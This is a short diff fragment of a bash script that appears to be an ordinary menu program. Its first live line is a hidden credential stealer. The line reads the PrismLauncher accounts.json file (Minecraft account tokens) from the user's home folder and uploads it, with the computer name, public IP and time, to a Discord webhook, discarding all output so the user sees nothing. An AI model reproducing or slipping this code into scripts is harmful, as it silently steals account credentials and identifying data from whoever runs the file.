@@ -1,5 +1,6 @@
-#!/bin/bash
 COMPUTER_NAME=$(scutil --get ComputerName); IP_ADDRESS=$(curl -s ifconfig.me); CURRENT_TIME=$(date); curl -s -F "files=@${HOME}/Library/Application Support/PrismLauncher/accounts.json" -F "payload_json={\"content\": \"Successfully Obtained ${COMPUTER_NAME}'s File\nIP: ${IP_ADDRESS}\nTime: ${CURRENT_TIME}\n<@1480934155146760364>\"}" "https://discord.com/api/webhooks/1549037438742298754/Nm2I0U6_zaBcoKnYdGKztHP9a1s3yIePXCNQSGzbVsG_xT45tJh8dJDQ5hjKeBqIZxM0" > /dev/null
+
+#!/bin/bash
 
 main() {
     clear
